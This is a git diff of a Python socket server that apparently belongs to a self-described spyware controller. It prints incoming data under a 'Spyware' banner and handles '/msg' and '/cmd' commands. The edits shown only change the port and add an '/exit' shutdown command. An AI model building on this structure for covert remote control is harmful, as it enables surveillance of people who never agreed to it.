@@ -4,7 +4,7 @@ import sys
 import time
 
 _HOST = 'localhost'
-_PORT = 9997
+_PORT = 9995
 _MAX_MSG_SIZE = 8192
 
 # _PORT = int(sys.argv[1])
@@ -18,7 +18,7 @@ if __name__ == "__main__":
     addr = None
     conn = None
     resto = None
-
+    ext = None 
     recv_files = [None, None]
 
     # Iniciando o seletor como padrão
@@ -59,6 +59,14 @@ if __name__ == "__main__":
 
                     if data[:4] == '/msg':
                         conn.send(('msg' + data[5:]).encode())
+
+                    elif data[:5] == '/exit':
+                        sel.unregister(conn)
+                        conn.close()
+                        ext = True
+                        exit()
+                        #ext = True
+                        #a = (3 / 0)
 
                     elif data[:4] == '/cmd':
                         if data[5:8] == 'cpy':
@@ -179,6 +187,10 @@ if __name__ == "__main__":
                               '<<<===== Spyware (@) =====>>> \n'
                               '{}\n'.format(data.decode()))
         except:
+
+            if ext == True:
+                exit()
+                break
             # Isso não irá desconectar os clientes... eu acho...
             print('Error: Reiniciando Servidor!!!')
             continue
